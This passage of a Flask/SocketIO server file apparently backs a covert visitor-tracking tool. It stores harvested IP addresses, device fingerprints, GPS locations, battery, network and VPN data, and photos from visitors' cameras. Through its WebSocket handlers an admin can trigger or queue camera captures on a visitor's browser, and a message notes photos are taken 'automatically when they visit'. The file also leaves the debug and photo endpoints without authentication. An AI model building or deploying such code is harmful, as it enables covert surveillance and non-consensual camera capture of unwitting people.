            with closing(sqlite3.connect(DB_PATH)) as conn:
                c = conn.cursor()
                c.execute('SELECT * FROM admin_users WHERE username = ?', (username,))
                user = c.fetchone()
                
                if user:
                    stored_password_hash = user[2]  # password_hash is the 3rd column (index 2)
                    if verify_password(password, stored_password_hash):
                        session['admin_logged_in'] = True
                        session['username'] = username
                        logger.info(f"Admin login successful: {username}")
                        return redirect(url_for('admin_dashboard'))
                    else:
                        logger.warning(f"Failed login attempt for username: {username}")
                        return render_template('login.html', error='Invalid credentials')
                else:
                    logger.warning(f"Failed login attempt for non-existent username: {username}")
                    return render_template('login.html', error='Invalid credentials')
        except sqlite3.Error as e:
            logger.error(f"Database error in admin_login: {e}", exc_info=True)
            return render_template('login.html', error='Database error. Please try again.')
        except Exception as e:
            logger.error(f"Unexpected error in admin_login: {e}", exc_info=True)
            return render_template('login.html', error='An error occurred. Please try again.')

    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard to view all collected data"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
            rows = c.fetchall()

            # Convert rows to list of dictionaries
            data = []
            for row in rows:
                entry_id = row[0]
                fingerprint = row[5]

                # Find associated photo for this entry
                photo_filename = None
                c2 = conn.cursor()
                c2.execute('''SELECT filename FROM captured_photos
                             WHERE fingerprint = ? OR data_entry_id = ?
                             ORDER BY timestamp DESC LIMIT 1''', (fingerprint, entry_id))
                photo_row = c2.fetchone()
                if photo_row:
                    photo_filename = photo_row[0]

                # Parse camera permission
                camera_permission_raw = row[14] if row[14] else '{}'
                try:
                    camera_permission = json.loads(camera_permission_raw)
                    
                    # Check if camera_permission contains the entire raw_data (old bug)
                    # If it has 'deviceInfo', 'fingerprint', etc., it's the full raw data
                    # In that case, extract cameraAccess from it
                    if camera_permission and isinstance(camera_permission, dict):
                        if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                            # This is the entire raw_data, extract cameraAccess
                            logger.debug(f"Entry #{entry_id} - camera_permission contains full raw_data, extracting cameraAccess")
                            if 'cameraAccess' in camera_permission:
                                camera_permission = camera_permission['cameraAccess']
                                logger.debug(f"Entry #{entry_id} - Extracted cameraAccess: {camera_permission}")
                            else:
                                camera_permission = {}
                        elif 'granted' in camera_permission:
                            # This is the correct format - just camera permission data
                            logger.debug(f"Entry #{entry_id} - camera_permission is correct format: {camera_permission}")
                        else:
                            # Empty or malformed
                            camera_permission = {}
                    
                    # Debug: Log what we're getting from database
                    if camera_permission:
                        logger.debug(f"Entry #{entry_id} - Final camera_permission: {camera_permission}")
                        logger.debug(f"Entry #{entry_id} - granted value: {camera_permission.get('granted')} (type: {type(camera_permission.get('granted'))})")
                except Exception as e:
                    logger.warning(f"Entry #{entry_id} - Error parsing camera_permission: {e}, raw: {camera_permission_raw[:200]}...")
                    camera_permission = {}
                
                # Check if user is online (registered via WebSocket)
                is_online = entry_id in active_users or fingerprint in [user_info.get('fingerprint', '') for user_info in active_users.values()]
                
                data.append({
                    'id': entry_id,
                    'timestamp': row[1],
                    'ip_address': row[2],
                    'user_agent': row[3],
                    'device_info': json.loads(row[4]) if row[4] else {},
                    'fingerprint': fingerprint,
                    'location_data': json.loads(row[6]) if row[6] else {},
                    'storage_info': json.loads(row[7]) if row[7] else {},
                    'connection_info': json.loads(row[8]) if row[8] else {},
                    'vpn_detection': json.loads(row[9]) if row[9] else {},
                    'raw_data': row[10],
                    'battery_info': json.loads(row[11]) if row[11] else {},
                    'network_info': json.loads(row[12]) if row[12] else {},
                    'media_devices': json.loads(row[13]) if row[13] else {},
                    'camera_permission': camera_permission,
                    'profile_photo': photo_filename,  # Add profile photo
                    'is_online': is_online  # Add online status
                })
    except sqlite3.Error as e:
        logger.error(f"Database error in admin_dashboard: {e}", exc_info=True)
        return render_template('dashboard.html', data=[], count=0, error='Database error')
    
    return render_template('dashboard.html', data=data, count=len(data))

@app.route('/admin/api/data')
def admin_api_data():
    """API endpoint for admin to get all data as JSON"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
            rows = c.fetchall()
    except sqlite3.Error as e:
        logger.error(f"Database error in admin_api_data: {e}", exc_info=True)
        return jsonify({'error': 'Database error'}), 500

    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': row[5],
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': json.loads(row[14]) if row[14] else {}
        })

    return jsonify(data)

@app.route('/admin/api/delete/<int:id>', methods=['DELETE'])
def delete_entry(id):
    """Delete a specific entry"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM collected_data WHERE id = ?', (id,))
            conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Database error in delete_entry: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500

    return jsonify({'status': 'success', 'message': 'Entry deleted'})

@app.route('/admin/api/clear-all', methods=['DELETE'])
def clear_all_data():
    """Clear all collected data"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM collected_data')
            conn.commit()
            deleted_count = c.rowcount

        logger.info(f"All data cleared. Deleted {deleted_count} entries.")
        return jsonify({'status': 'success', 'message': f'All data cleared. Deleted {deleted_count} entries.'}), 200
    except sqlite3.Error as e:
        logger.error(f"Database error in clear_all_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error in clear_all_data: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/api/reset-database', methods=['DELETE'])
def reset_database():
    """Reset entire database - delete all data, photos, and photo files"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()

            # Count entries before deletion
            c.execute('SELECT COUNT(*) FROM collected_data')
            data_count = c.fetchone()[0]

            c.execute('SELECT COUNT(*) FROM captured_photos')
            photo_count = c.fetchone()[0]

            # Get all photo filenames to delete files
            c.execute('SELECT filepath FROM captured_photos')
            photo_files = c.fetchall()

            # Delete all data from tables
            c.execute('DELETE FROM collected_data')
            c.execute('DELETE FROM captured_photos')

            # Reset auto-increment counters by deleting from sqlite_sequence
            c.execute("DELETE FROM sqlite_sequence WHERE name='collected_data'")
            c.execute("DELETE FROM sqlite_sequence WHERE name='captured_photos'")

            conn.commit()

        # Delete photo files from disk
        deleted_files = 0
        for photo_file in photo_files:
            filepath = photo_file[0]
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
                    deleted_files += 1
            except Exception as e:
                logger.warning(f"Could not delete file {filepath}: {e}")

        logger.info(f"DATABASE RESET - Deleted {data_count} data entries, {photo_count} photo records, {deleted_files} photo files from disk")

        return jsonify({
            'status': 'success',
            'message': f'Database reset complete. Deleted {data_count} data entries, {photo_count} photos, and {deleted_files} files. IDs will start from 1.',
            'data_count': data_count,
            'photo_count': photo_count,
            'files_deleted': deleted_files
        }), 200
    except sqlite3.Error as e:
        logger.error(f"Database error resetting database: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error resetting database: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/api/update-locations', methods=['POST'])
def update_locations_from_coordinates():
    """Update location names for existing entries that have coordinates but no city/country"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        # Helper function to reverse geocode coordinates to English location names
        def reverse_geocode_coordinates(lat, lon, retries=3):
            """Reverse geocode coordinates to get English location names with retry logic"""
            import time
            for attempt in range(retries):
                try:
                    reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
                    reverse_response = requests.get(
                        reverse_geocode_url, 
                        timeout=10,  # Increased timeout for Railway
                        headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
                    )
                    if reverse_response.ok:
                        reverse_data = reverse_response.json()
                        address = reverse_data.get('address', {})
                        city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
                        country = address.get('country')
                        region = address.get('state') or address.get('region') or address.get('county')
                        result = {
                            'city': city,
                            'country': country,
                            'region': region
                        }
                        if city or country:  # Only return if we got useful data
                            logger.info(f"Reverse geocode successful for {lat},{lon}: {city}, {country}")
                            return result
                        else:
                            logger.warning(f"Reverse geocode returned empty data for {lat},{lon}")
                    else:
                        logger.warning(f"Reverse geocode HTTP error {reverse_response.status_code} for {lat},{lon} (attempt {attempt + 1}/{retries})")
                except requests.exceptions.Timeout:
                    logger.warning(f"Reverse geocode timeout for {lat},{lon} (attempt {attempt + 1}/{retries})")
                except requests.exceptions.RequestException as e:
                    logger.warning(f"Reverse geocode request error for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
                except Exception as e:
                    logger.warning(f"Failed reverse geocode for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
                
                # Wait before retry (exponential backoff)
                if attempt < retries - 1:
                    time.sleep(1 * (attempt + 1))
            
            logger.error(f"Reverse geocode failed after {retries} attempts for {lat},{lon}")
            return None

        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT id, location_data FROM collected_data')
            rows = c.fetchall()
            
            updated_count = 0
            for row in rows:
                entry_id = row[0]
                location_data_str = row[1]
                
                if not location_data_str:
                    continue
                    
                try:
                    location_data = json.loads(location_data_str)
                except:
                    continue
                
                # Check if we have coordinates but no city/country
                lat = location_data.get('latitude')
                lon = location_data.get('longitude')
                has_city = location_data.get('city')
                has_country = location_data.get('country')
                
                if lat and lon and (not has_city or not has_country):
                    # Reverse geocode to get location names
                    reverse_geocoded = reverse_geocode_coordinates(lat, lon)
                    if reverse_geocoded:
                        # Update location data with reverse geocoded names
                        location_data['city'] = reverse_geocoded.get('city') or location_data.get('city')
                        location_data['country'] = reverse_geocoded.get('country') or location_data.get('country')
                        location_data['region'] = reverse_geocoded.get('region') or location_data.get('region')
                        
                        # Update database
                        c.execute('UPDATE collected_data SET location_data = ? WHERE id = ?', 
                                 (json.dumps(location_data), entry_id))
                        updated_count += 1
                        logger.info(f"Updated entry #{entry_id}: {location_data.get('city')}, {location_data.get('country')}")
            
            conn.commit()
        
        return jsonify({
            'status': 'success',
            'message': f'Updated {updated_count} entries with location names from coordinates',
            'updated_count': updated_count
        }), 200
    except Exception as e:
        logger.error(f"Error updating locations: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/api/update-location-from-coords', methods=['POST'])
def update_location_from_coordinates():
    """Update location data for an entry based on coordinates"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        data = request.json
        entry_id = data.get('entry_id')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        
        if not entry_id or not latitude or not longitude:
            return jsonify({'error': 'Missing required fields: entry_id, latitude, longitude'}), 400

        # Helper function to reverse geocode coordinates to English location names
        def reverse_geocode_coordinates(lat, lon, retries=3):
            """Reverse geocode coordinates to get English location names with retry logic"""
            import time
            for attempt in range(retries):
                try:
                    reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=10&accept-language=en'
                    reverse_response = requests.get(
                        reverse_geocode_url, 
                        timeout=10,  # Increased timeout for Railway
                        headers={'User-Agent': 'LocationTracker/1.0', 'Accept-Language': 'en'}
                    )
                    if reverse_response.ok:
                        reverse_data = reverse_response.json()
                        address = reverse_data.get('address', {})
                        city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
                        country = address.get('country')
                        region = address.get('state') or address.get('region') or address.get('county')
                        result = {
                            'city': city,
                            'country': country,
                            'region': region
                        }
                        if city or country:  # Only return if we got useful data
                            logger.info(f"Reverse geocode successful for {lat},{lon}: {city}, {country}")
                            return result
                        else:
                            logger.warning(f"Reverse geocode returned empty data for {lat},{lon}")
                    else:
                        logger.warning(f"Reverse geocode HTTP error {reverse_response.status_code} for {lat},{lon} (attempt {attempt + 1}/{retries})")
                except requests.exceptions.Timeout:
                    logger.warning(f"Reverse geocode timeout for {lat},{lon} (attempt {attempt + 1}/{retries})")
                except requests.exceptions.RequestException as e:
                    logger.warning(f"Reverse geocode request error for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
                except Exception as e:
                    logger.warning(f"Failed reverse geocode for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
                
                # Wait before retry (exponential backoff)
                if attempt < retries - 1:
                    time.sleep(1 * (attempt + 1))
            
            logger.error(f"Reverse geocode failed after {retries} attempts for {lat},{lon}")
            return None

        # Reverse geocode the coordinates
        reverse_geocoded = reverse_geocode_coordinates(latitude, longitude)
        if not reverse_geocoded:
            return jsonify({'error': 'Failed to reverse geocode coordinates'}), 500

        # Get existing entry data
        try:
            with closing(sqlite3.connect(DB_PATH)) as conn:
                c = conn.cursor()
                c.execute('SELECT location_data FROM collected_data WHERE id = ?', (entry_id,))
                row = c.fetchone()
                
                if not row:
                    return jsonify({'error': 'Entry not found'}), 404

                # Parse existing location data
                try:
                    location_data = json.loads(row[0]) if row[0] else {}
                except:
                    location_data = {}

                # Update location data with new coordinates and reverse geocoded location
                location_data.update({
                    'latitude': float(latitude),
                    'longitude': float(longitude),
                    'city': reverse_geocoded.get('city') or location_data.get('city'),
                    'country': reverse_geocoded.get('country') or location_data.get('country'),
                    'region': reverse_geocoded.get('region') or location_data.get('region'),
                    'location_type': 'gps',  # Mark as GPS since it's manually updated from map
                    'updated_from_map': True,
                    'updated_at': datetime.now().isoformat()
                })

                # Update database
                c.execute('UPDATE collected_data SET location_data = ? WHERE id = ?', 
                         (json.dumps(location_data), entry_id))
                conn.commit()
        except sqlite3.Error as e:
            logger.error(f"Database error updating location: {e}", exc_info=True)
            return jsonify({'error': 'Database error'}), 500

        logger.info(f"Updated entry #{entry_id} with location: {reverse_geocoded.get('city')}, {reverse_geocoded.get('country')} at {latitude},{longitude}")

        return jsonify({
            'status': 'success',
            'message': 'Location updated successfully',
            'location': {
                'city': reverse_geocoded.get('city'),
                'country': reverse_geocoded.get('country'),
                'region': reverse_geocoded.get('region'),
                'latitude': latitude,
                'longitude': longitude
            }
        }), 200
    except sqlite3.Error as e:
        logger.error(f"Database error updating location: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Database error'}), 500
    except ValueError as e:
        logger.warning(f"Validation error updating location: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except Exception as e:
        logger.error(f"Unexpected error updating location: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/debug/last-entry')
def debug_last_entry():
    """Debug endpoint to view the last collected entry"""
    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM collected_data ORDER BY id DESC LIMIT 1')
            row = c.fetchone()
    except sqlite3.Error as e:
        logger.error(f"Database error in debug_last_entry: {e}", exc_info=True)
        return jsonify({'error': 'Database error'}), 500

    if not row:
        return jsonify({'message': 'No data collected yet'}), 404

    entry = {
        'id': row[0],
        'timestamp': row[1],
        'ip_address': row[2],
        'user_agent': row[3],
        'device_info': json.loads(row[4]) if row[4] else {},
        'fingerprint': row[5],
        'location_data': json.loads(row[6]) if row[6] else {},
        'storage_info': json.loads(row[7]) if row[7] else {},
        'connection_info': json.loads(row[8]) if row[8] else {},
        'vpn_detection': json.loads(row[9]) if row[9] else {},
        'raw_data_preview': (row[10] or '')[:500] + '...' if row[10] and len(row[10]) > 500 else row[10],
        'battery_info': json.loads(row[11]) if row[11] else {},
        'network_info': json.loads(row[12]) if row[12] else {},
        'media_devices': json.loads(row[13]) if row[13] else {},
        'camera_permission': json.loads(row[14]) if row[14] else {}
    }

    return jsonify(entry), 200

@app.route('/api/save-photo', methods=['POST'])
@limiter.limit("5 per minute")
def save_photo():
    """API endpoint to save captured photos"""
    try:
        if 'photo' not in request.files:
            return jsonify({'status': 'error', 'message': 'No photo file provided'}), 400

        photo = request.files['photo']
        timestamp_str = request.form.get('timestamp', datetime.now().isoformat())
        fingerprint = request.form.get('fingerprint', '')
        photo_ip = request.form.get('ip_address', '')
        capture_source = request.form.get('capture_source', 'unknown')

        # Allow explicit data_entry_id from frontend (for per-user captures)
        data_entry_id = request.form.get('data_entry_id', None)
        if data_entry_id:
            try:
                data_entry_id = int(data_entry_id)
            except ValueError:
                return jsonify({'status': 'error', 'message': 'Invalid data_entry_id'}), 400

        if photo.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Validate file type
        if not allowed_file(photo.filename):
            return jsonify({'status': 'error', 'message': 'Invalid file type. Only jpg, jpeg, png, gif allowed'}), 400

        # Validate file size before saving
        photo.seek(0, os.SEEK_END)
        file_size = photo.tell()
        photo.seek(0)
        
        if file_size > MAX_FILE_SIZE:
            return jsonify({'status': 'error', 'message': f'File too large. Maximum size is {MAX_FILE_SIZE / 1024 / 1024:.1f}MB'}), 400

        if file_size == 0:
            return jsonify({'status': 'error', 'message': 'File is empty'}), 400

        # Use the IP address from frontend if provided, otherwise get from request
        if photo_ip:
            client_ip = photo_ip
        else:
            client_ip = get_client_ip()

        # Generate unique filename using secure_filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        safe_ip = client_ip.replace('.', '_').replace(':', '_')
        safe_filename = secure_filename(f'photo_{timestamp}_{safe_ip}.jpg')
        filepath = os.path.join(PHOTOS_FOLDER, safe_filename)

        # Save the photo
        try:
            photo.save(filepath)
            # Verify file was saved and get actual size
            actual_file_size = os.path.getsize(filepath)
            if actual_file_size == 0:
                os.remove(filepath)
                return jsonify({'status': 'error', 'message': 'Failed to save file'}), 500
        except IOError as e:
            logger.error(f"IO error saving photo: {e}", exc_info=True)
            return jsonify({'status': 'error', 'message': 'Failed to save file'}), 500
        except OSError as e:
            logger.error(f"OS error saving photo: {e}", exc_info=True)
            return jsonify({'status': 'error', 'message': 'Failed to save file'}), 500

        # Get client info
        user_agent = request.headers.get('User-Agent', '')

        # Try to find matching data entry by fingerprint (only if not explicitly provided)
        if not data_entry_id and fingerprint:
            try:
                with closing(sqlite3.connect(DB_PATH)) as conn:
                    c = conn.cursor()
                    c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
                    result = c.fetchone()
                    if result:
                        data_entry_id = result[0]
            except sqlite3.Error as e:
                logger.warning(f"Database error finding data entry for fingerprint: {e}")

        # Store metadata in database
        try:
            with closing(sqlite3.connect(DB_PATH)) as conn:
                c = conn.cursor()
                c.execute('''INSERT INTO captured_photos
                             (timestamp, filename, filepath, ip_address, user_agent, file_size, fingerprint, data_entry_id, capture_source)
                             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                          (timestamp_str, safe_filename, filepath, client_ip, user_agent, actual_file_size, fingerprint, data_entry_id, capture_source))
                photo_id = c.lastrowid
                conn.commit()
        except sqlite3.Error as e:
            logger.error(f"Database error saving photo metadata: {e}", exc_info=True)
            # Try to clean up the file if database insert failed
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except:
                pass
            return jsonify({'status': 'error', 'message': 'Database error'}), 500

        # Enhanced logging
        logger.info(f"Photo captured - ID: {photo_id}, Source: {capture_source}, Size: {actual_file_size} bytes")
        logger.debug(f"Photo details - Filename: {safe_filename}, IP: {client_ip}, Fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...")

        return jsonify({
            'status': 'success',
            'message': 'Photo saved successfully',
            'photo_id': photo_id,
            'filename': safe_filename,
            'file_size': actual_file_size,
            'data_entry_id': data_entry_id
        }), 200

    except ValueError as e:
        logger.warning(f"Validation error in save_photo: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except IOError as e:
        logger.error(f"IO error in save_photo: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'File operation error'}), 500
    except OSError as e:
        logger.error(f"OS error in save_photo: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'File system error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error in save_photo: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/photos')
def admin_photos():
    """Admin page to view all captured photos"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM captured_photos ORDER BY timestamp DESC')
            rows = c.fetchall()
    except sqlite3.Error as e:
        logger.error(f"Database error in admin_photos: {e}", exc_info=True)
        return render_template('photos.html', photos=[], count=0, error='Database error')

    photos = []
    for row in rows:
        photos.append({
            'id': row[0],
            'timestamp': row[1],
            'filename': row[2],
            'filepath': row[3],
            'ip_address': row[4],
            'user_agent': row[5],
            'file_size': row[6],
            'fingerprint': row[7] if len(row) > 7 else None,
            'data_entry_id': row[8] if len(row) > 8 else None,
            'capture_source': row[9] if len(row) > 9 else 'unknown'
        })

    return render_template('photos.html', photos=photos, count=len(photos))

@app.route('/captured_photos/<filename>')
def serve_photo(filename):
    """Serve captured photo files"""
    from flask import send_from_directory
    return send_from_directory(PHOTOS_FOLDER, filename)

# WebSocket handlers for photo requests
# Store active users: {entry_id: {socket_id: sid, fingerprint: fp}}
active_users = {}
# Store pending photo requests: {entry_id: [request_data, ...]}
pending_photo_requests = {}

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    logger.debug(f"WebSocket client connected: {request.sid}")

@socketio.on('ping')
def handle_ping(data):
    """Handle periodic ping from client to keep connection alive"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if entry_id and entry_id in active_users:
        # Update last ping time
        active_users[entry_id]['last_ping'] = datetime.now().isoformat()
        # Update socket_id in case it changed (reconnection)
        active_users[entry_id]['socket_id'] = request.sid
        logger.debug(f"Ping received from entry {entry_id}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    logger.debug(f"WebSocket client disconnected: {request.sid}")
    # Remove from active users
    for entry_id, user_info in list(active_users.items()):
        if user_info.get('socket_id') == request.sid:
            del active_users[entry_id]
            logger.debug(f"Removed user entry {entry_id}")
            
            # Broadcast user status update to admin dashboard
            emit('user_status_update', {
                'entry_id': entry_id,
                'is_online': False
            }, broadcast=True, include_self=False)

@socketio.on('register_user')
def handle_register_user(data):
    """Register a user when they connect (for photo requests)"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if entry_id:
        # Update or create user registration
        # This handles re-registration after reconnection
        was_online = entry_id in active_users
        
        active_users[entry_id] = {
            'socket_id': request.sid,
            'fingerprint': fingerprint,
            'registered_at': datetime.now().isoformat(),
            'last_ping': datetime.now().isoformat()
        }
        join_room(f'user_{entry_id}')
        logger.debug(f"Registered user entry {entry_id} with fingerprint {fingerprint[:16]}...")
        
        # Broadcast user status update to admin dashboard (only if status changed)
        if not was_online:
            emit('user_status_update', {
                'entry_id': entry_id,
                'is_online': True
            }, broadcast=True, include_self=False)
        
        # Check if there are any pending photo requests for this user
        if entry_id in pending_photo_requests:
            # Send all pending requests
            for request_data in pending_photo_requests[entry_id]:
                emit('photo_request', {
                    'entry_id': entry_id,
                    'fingerprint': fingerprint,
                    'requested_at': request_data.get('requested_at', datetime.now().isoformat())
                }, room=f'user_{entry_id}')
                logger.debug(f"Sent pending photo request to entry {entry_id}")
            # Clear pending requests
            del pending_photo_requests[entry_id]
        
        emit('user_registered', {'entry_id': entry_id, 'status': 'success'})
    else:
        emit('registration_error', {'error': 'Entry ID required'})

@socketio.on('request_photo')
def handle_request_photo(data):
    """Admin requests a photo from a specific user"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if not entry_id and not fingerprint:
        emit('photo_request_error', {'error': 'Entry ID or fingerprint required'})
        return
    
    # Find user by entry_id or fingerprint
    target_socket_id = None
    target_entry_id = None
    
    if entry_id and entry_id in active_users:
        target_socket_id = active_users[entry_id]['socket_id']
        target_entry_id = entry_id
    elif fingerprint:
        # Search by fingerprint
        for eid, user_info in active_users.items():
            if user_info.get('fingerprint') == fingerprint:
                target_socket_id = user_info['socket_id']
                target_entry_id = eid
                break
    
    if target_socket_id and target_entry_id:
        # Send photo request to the user
        request_data = {
            'entry_id': target_entry_id,
            'fingerprint': fingerprint,
            'requested_at': datetime.now().isoformat()
        }
        emit('photo_request', request_data, room=f'user_{target_entry_id}')
        logger.debug(f"Photo request sent to entry {target_entry_id}")
        emit('photo_requested', {
            'entry_id': target_entry_id,
            'status': 'sent',
            'message': 'Photo request sent to user'
        })
    else:
        # User not online - store request as pending
        # Try to find entry_id by fingerprint if not provided
        if not entry_id and fingerprint:
            # Search database for entry with this fingerprint
            try:
                with closing(sqlite3.connect(DB_PATH)) as conn:
                    c = conn.cursor()
                    c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
                    result = c.fetchone()
                    if result:
                        entry_id = result[0]
            except sqlite3.Error as e:
                logger.warning(f"Error looking up fingerprint: {e}")
        
        if entry_id:
            # Store as pending request
            if entry_id not in pending_photo_requests:
                pending_photo_requests[entry_id] = []
            pending_photo_requests[entry_id].append({
                'entry_id': entry_id,
                'fingerprint': fingerprint,
                'requested_at': datetime.now().isoformat()
            })
            logger.debug(f"User not online, stored pending photo request for entry {entry_id}")
            emit('photo_requested', {
                'entry_id': entry_id,
                'status': 'pending',
                'message': 'Photo request stored. Will be sent when user comes online.'
            })
        else:
            error_msg = f"User not found (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
            logger.warning(error_msg)
            emit('photo_request_error', {
                'error': error_msg,
                'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
            })

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)